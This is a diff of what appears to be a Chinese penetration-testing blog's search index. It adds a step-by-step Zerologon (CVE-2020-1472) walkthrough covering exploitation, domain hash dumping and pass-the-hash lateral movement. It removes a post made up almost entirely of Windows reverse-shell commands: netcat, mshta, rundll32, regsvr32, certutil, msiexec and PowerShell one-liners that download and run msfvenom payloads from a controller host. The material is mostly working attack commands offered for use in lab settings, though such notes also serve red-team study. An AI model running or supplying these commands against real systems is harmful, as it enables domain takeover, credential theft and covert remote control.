@@ -58,6 +58,83 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2020-1472 Netlogon域权限提升漏洞</title>
+    <url>/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="CVE-2020-1472-Netlogon域权限提升漏洞"><a href="#CVE-2020-1472-Netlogon域权限提升漏洞" class="headerlink" title="CVE-2020-1472 Netlogon域权限提升漏洞"></a>CVE-2020-1472 Netlogon域权限提升漏洞</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h3><p><strong>漏洞编号：</strong>CVE-2020-1472</p>
+<p><strong>漏洞名称：</strong>Netlogon域权限提升</p>
+<p><strong>漏洞描述：</strong>2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞 的风险通告。攻击者通过NetLogon（MS-NRPC）， 建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中 的设备上运行经特殊设计的应用程序。</p>
+<p><strong>影响版本：</strong></p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 </p>
+<p>Windows Server 2012 </p>
+<p>Windows Server 2016 </p>
+<p>Windows Server 2019 </p>
+<p>Windows Server, version 1903 (Server Core installation) </p>
+<p>Windows Server, version 1909 (Server Core installation) </p>
+<p>Windows Server, version 2004 (Server Core installation)</p>
+<span id="more"></span>
+
+<h3 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>环境：DC</p>
+<p>IP    ： 192.168.31.78 /10.10.10.10</p>
+<ol>
+<li><h6 id="查看域控主机名称"><a href="#查看域控主机名称" class="headerlink" title="查看域控主机名称"></a>查看域控主机名称</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png"></p>
+<ol start="2">
+<li><h6 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h6></li>
+</ol>
+<blockquote>
+<p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 zerologon_tester.py DC <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png"></p>
+<ol start="3">
+<li><h6 id="漏洞利用，重置域账号的哈希"><a href="#漏洞利用，重置域账号的哈希" class="headerlink" title="漏洞利用，重置域账号的哈希"></a>漏洞利用，重置域账号的哈希</h6></li>
+</ol>
+<blockquote>
+<p><a href="https://github.com/blackarrowsec/redteam-research">https://github.com/blackarrowsec/redteam-research</a></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python CVE<span class="literal">-2020</span><span class="literal">-1472</span>.py DC DC<span class="variable">$</span> <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/3.png"></p>
+<ol start="4">
+<li><h6 id="获取域控用户hash"><a href="#获取域控用户hash" class="headerlink" title="获取域控用户hash"></a>获取域控用户hash</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py <span class="string">&#x27;de1ay.com/DC$@192.168.123.136&#x27;</span> <span class="literal">-no</span><span class="literal">-pass</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/4.png"></p>
+<ol start="5">
+<li><h6 id="wmiexec进行hash横向连接"><a href="#wmiexec进行hash横向连接" class="headerlink" title="wmiexec进行hash横向连接"></a>wmiexec进行hash横向连接</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python wmiexec.py <span class="literal">-hashes</span> aad3b435b51404eeaad3b435b51404ee:<span class="number">3</span>b24c391862f4a8531a245a0217708c4 DC<span class="variable">$</span>/Administrator@<span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/5.png"></p>
+<ol start="6">
+<li><h6 id="恢复域-获取hash"><a href="#恢复域-获取hash" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取sam数据库</span></span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line"><span class="built_in">del</span> /f system.save</span><br><span class="line"><span class="built_in">del</span> /f sam.save</span><br><span class="line"><span class="built_in">del</span> /f security.sav</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><h6 id="恢复域-获取hash-1"><a href="#恢复域-获取hash-1" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取hash</span></span><br><span class="line">python secretsdump.py <span class="literal">-sam</span> sam.save <span class="literal">-system</span> system.save <span class="literal">-security</span> security.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/6.png"></p>
+<ol start="8">
+<li><h6 id="恢复域"><a href="#恢复域" class="headerlink" title="恢复域"></a>恢复域</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python reinstall_original_pw.py DC <span class="number">192.168</span>.<span class="number">31.78</span> f2b1b4d01ab6f44f28634a765bc53836</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/7.png"></p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux主机信息收集</title>
     <url>/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Linux主机渗透"><a href="#0x00-Linux主机渗透" class="headerlink" title="0x00 Linux主机渗透"></a>0x00 Linux主机渗透</h3><h5 id="MSF生成LUNIX平台可执行文件"><a href="#MSF生成LUNIX平台可执行文件" class="headerlink" title="MSF生成LUNIX平台可执行文件"></a>MSF生成LUNIX平台可执行文件</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> elf <span class="literal">-o</span> localmsf8882.elf</span><br></pre></td></tr></table></figure>
@@ -357,125 +434,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Window反弹Shell</title>
-    <url>/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/</url>
-    <content><![CDATA[<h1 id="Window反弹SHELL"><a href="#Window反弹SHELL" class="headerlink" title="Window反弹SHELL"></a>Window反弹SHELL</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-反弹SHELL简介"><a href="#0x00-反弹SHELL简介" class="headerlink" title="0x00  反弹SHELL简介"></a>0x00  反弹SHELL简介</h3><h6 id="什么是反弹shell（reverse-shell）？"><a href="#什么是反弹shell（reverse-shell）？" class="headerlink" title="什么是反弹shell（reverse shell）？"></a>什么是反弹shell（reverse shell）？</h6><p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
-<h6 id="为什么需要反弹shell？"><a href="#为什么需要反弹shell？" class="headerlink" title="为什么需要反弹shell？"></a>为什么需要反弹shell？</h6><p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
-<blockquote>
-<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p>
-<p>反向Shell（反弹Shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端 口被占用等问题导致被控端不能正常接收发送过来的数据包。</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01-Windows反弹Shell"><a href="#0x01-Windows反弹Shell" class="headerlink" title="0x01 Windows反弹Shell"></a>0x01 Windows反弹Shell</h3><h4 id="NetCat（NC）"><a href="#NetCat（NC）" class="headerlink" title="NetCat（NC）"></a>NetCat（NC）</h4><h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/1.png"></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="number">192.168</span>.<span class="number">31.198</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/2.png"></p>
-<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-e</span> cmd.exe <span class="number">192.168</span>.<span class="number">31.246</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/3.png"></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/4.png"></p>
-<h4 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h4><p>mshta.exe是用于负责解释运行HTA(HTML应用程序)文件的Windows系统应用程序。可以运行JavaScript或 VBScript的HTML文件。</p>
-<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lport <span class="number">7777</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/jmTzAZDOdeGOUV.hta</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/5.png"></p>
-<blockquote>
-<p>Tips:</p>
-<p>在VPS上使用hta_server模块设置lhost时可能会出现无法接收到shelll的问题，是因为VPS主机内部全部采用私有IP地址（如192.68.0.X)，通过一个公共的IP地址与外界进行通信。</p>
-<p>需要设置reverselistenerbindaddress 选项，绑定到本地系统上的特定IP地址</p>
-</blockquote>
-<h6 id><a href="#" class="headerlink" title></a></h6><h6 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> <span class="literal">-o</span> <span class="number">1</span>.hta</span><br><span class="line">python –m SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/<span class="number">1</span>.hta</span><br></pre></td></tr></table></figure>
-
-<h6 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h6><ol>
-<li>生成hta</li>
-</ol>
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/6.png"></p>
-<ol start="2">
-<li><p>生成恶意站点</p>
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/7.png"></p>
-</li>
-</ol>
-<h4 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h4><p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存 库中。 动态链接库英文为DLL (Dynamic Link Library) 。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p>
-<h6 id="MSF-SMB-Delivery"><a href="#MSF-SMB-Delivery" class="headerlink" title="MSF  SMB Delivery"></a>MSF  SMB Delivery</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; exploit <span class="literal">-j</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">&gt;rundll32.exe \\<span class="number">192.168</span>.<span class="number">31.246</span>\bupl\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/8.png"></p>
-<h6 id="Msfvenom生成反弹shell的dll"><a href="#Msfvenom生成反弹shell的dll" class="headerlink" title="Msfvenom生成反弹shell的dll"></a>Msfvenom生成反弹shell的dll</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-a</span> x64 -<span class="literal">-platform</span> windows <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">6666</span> <span class="operator">-f</span> dll &gt; lyxc.dll</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">6666</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/lyxc.dll	<span class="comment">#从控制端下载msfvenom生成的dll文件</span></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\Users\LYXC\lyxc.dll</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/9.png"></p>
-<h6 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> &gt; <span class="number">2</span>.hta</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">7777</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">2</span>.hta </span><br><span class="line">rundll32.exe url.dll,OpenURL C:\User\LYXC\<span class="number">2</span>.hta</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h4><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。 Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
-<blockquote>
-<p>语法:</p>
-<p>Regsvr32 [/s] [/u] [/n][/i[:cmdline]]  </p>
-<p>/u - 注销服务器 </p>
-<p>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载 </p>
-<p>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用 </p>
-<p>/s - 沉默; 不显示消息框</p>
-</blockquote>
-<h6 id="Web-Delivery模块启动Regsvr32"><a href="#Web-Delivery模块启动Regsvr32" class="headerlink" title="Web Delivery模块启动Regsvr32"></a>Web Delivery模块启动Regsvr32</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> target <span class="number">3</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span> </span><br><span class="line">msf6 exploit (web_delivery)&gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">regsvr32 /s /n /u /i:http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">3</span>urTH83.sct scrobj.dll</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/10.png"></p>
-<h4 id="Certuil-exe"><a href="#Certuil-exe" class="headerlink" title="Certuil.exe"></a>Certuil.exe</h4><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文 件以获得meterpreter会话。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">6667</span> <span class="operator">-f</span> exe &gt; msf6667.exe</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe c:\windows\temp\msf6667.exe &amp; <span class="built_in">start</span> </span><br><span class="line">c:\windows\temp\msf6667.exe</span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe delete</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h4><p>MSI就是microsoft installer的简写，是微软格式的安装包。一般是程序的安装软件包。 msiexe.exe是Windows系统安装引擎，MSI包就是使用msiexe.exe来解释安装。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">9999</span> <span class="operator">-f</span> msi &gt; <span class="number">1</span>.msi</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">msf &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">9999</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">31.246</span>/<span class="number">1</span>.msi</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Powershell-exe"><a href="#Powershell-exe" class="headerlink" title="Powershell.exe"></a>Powershell.exe</h4><h6 id="PowerShell加载远程脚本"><a href="#PowerShell加载远程脚本" class="headerlink" title="PowerShell加载远程脚本"></a>PowerShell加载远程脚本</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8899</span> <span class="operator">-f</span> psh<span class="literal">-reflection</span> <span class="literal">-o</span> shell.ps1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/11.png"></p>
-<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">powershell -windowstyle <span class="keyword">hidden</span> -exec bypass -<span class="keyword">c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/shell.ps1&#x27;)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/12.png"></p>
-<h6 id="PowerShell脚本Powercat"><a href="#PowerShell脚本Powercat" class="headerlink" title="PowerShell脚本Powercat"></a>PowerShell脚本Powercat</h6><p>Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码 的有效载荷。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/powercat.ps1&#x27;);powercat -c </span></span><br><span class="line"><span class="string">192.168.31.246 -p 8888 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/13.png"></p>
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/14.png"></p>
-<h6 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">msf6 exploit(web_delivery) &gt; exploit <span class="literal">-j</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/15.png"></p>
-<h6 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h6><p>PowerShell允许客户端通过执行cscript.exe来运行wsf、js和vbscript脚本。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">7777</span> <span class="operator">-f</span> vbs <span class="literal">-o</span> <span class="number">3</span>.vbs</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;(New-Object </span></span><br><span class="line"><span class="string">System.NET.WebClient).DownloadFile(&#x27;http://192.168.31.246/1.vbs&#x27;,\&quot;</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">&quot;);StartProcess %windir%\system32\cscript.exe \&quot;</span><span class="variable">$env:temp</span>\test.vbs\</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/16.png"></p>
-<h6 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8888</span> <span class="literal">-o</span> <span class="number">1</span>.bat</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4455</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="Metasploit生成exe文件"><a href="#Metasploit生成exe文件" class="headerlink" title="Metasploit生成exe文件"></a>Metasploit生成exe文件</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">4445</span> <span class="operator">-f</span> exe <span class="literal">-o</span> <span class="number">1</span>.exe</span><br><span class="line">msf5 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4445</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start</span> <span class="number">1</span>.exe</span><br><span class="line">powershell <span class="literal">-ep</span> bypass <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>
-
-
-
